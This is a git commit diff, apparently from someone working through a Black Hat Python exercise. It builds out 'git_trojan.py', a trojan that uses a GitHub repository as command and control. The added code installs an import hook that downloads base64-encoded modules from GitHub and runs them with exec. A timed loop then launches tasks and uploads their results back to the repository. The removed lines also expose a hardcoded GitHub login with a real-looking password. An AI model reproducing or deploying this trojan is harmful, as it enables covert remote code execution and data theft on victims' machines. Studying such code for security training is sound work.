f36b85f0b4bec6ea0e489a3bf27a492f62522792
Josh <joshfokis@gmail.com>
2014-11-19 15:27:58 -0600

    Updated

--- CH7/git_trojan.py
+++ CH7/git_trojan.py
@@ -20,8 +20,8 @@ task_queue = Queue.Queue()
 
 
 def connect_to_github():
-    gh = login(username="joshfokis", password="rerebug1")
-    repo = gh.repository("joshfokis", "Blackhat-Python/CH7")
+    gh = login(username="Username", password="Password")
+    repo = gh.repository("Username", "Directory")
     branch = repo.branch("master")
 
     return gh, repo, branch
@@ -37,7 +37,8 @@ def get_file_contents(filepath):
         if filepath in filename.path:
             print "[*] Found file %s" % filepath
             blob = repo.blob(filename._json_data['sha'])
-            return blob.get_file_contents
+            return blob.content
+
     return None
 
 
@@ -63,3 +64,53 @@ def store_module_result(data):
     repo.create_file(remote_path, 'Commit message', base64.b64encode(data))
 
     return
+
+
+class GitImporter(object):
+
+    def __init__(self):
+        self.current_module_code = ""
+
+    def find_module(self, fullname, path=None):
+        if configured:
+            print "[*] Attempting to retrieve %s" % fullname
+            new_library = get_file_contents("modules/%s" % fullname)
+
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+
+        return None
+
+    def load_module(self, name):
+
+        module = imp.new_module(name)
+        exec self.current_module_code in module.__dict__
+        sys.modules[name] = module
+
+        return module
+
+
+def module_runner(module):
+    task_queue.put(1)
+    result = sys.modules[module].run()
+    task_queue.get()
+
+    store_module_result(result)
+
+    return
+
+sys.meta_path = [GitImporter()]
+
+while True:
+
+    if task_queue.empty():
+
+        config = get_trojan_config()
+
+        for task in config:
+            t = threading.Thread(target=module_runner, args=(task['module'],))
+            t.start()
+            time.sleep(random.randint(1, 10))
+
+    time.sleep(random.randint(1000, 10000))
